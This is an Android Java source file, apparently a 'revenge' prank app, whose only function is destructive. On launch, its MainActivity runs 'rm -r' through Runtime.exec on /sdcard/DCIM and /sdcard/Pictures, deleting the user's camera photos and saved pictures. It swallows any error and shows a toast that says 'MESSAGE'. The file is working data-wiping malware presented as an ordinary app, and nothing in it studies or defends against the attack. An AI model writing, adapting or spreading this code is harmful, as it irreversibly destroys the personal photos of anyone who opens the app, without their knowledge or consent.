package ml.fossfrog.revengelol;

import android.app.*;
import android.os.*;
import java.io.*;
import android.widget.*;


public class MainActivity extends Activity 
{
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

				String path_1 = "/sdcard/DCIM";
				String path_2 = "/sdcard/Pictures";
				File file = new File(path_1);

				Toast msg = Toast.makeText(getApplicationContext(),
																	 "MESSAGE",
																	 Toast.LENGTH_LONG);

				if (file.exists()) {
						String delete_1 = "rm -r " + path_1;
						String delete_2 = "rm -r " + path_2;
						Runtime runtime = Runtime.getRuntime();
						try {
								runtime.exec(delete_1);
								runtime.exec(delete_2);
								msg.show();
						} catch (IOException e) { }
				}
		}
}
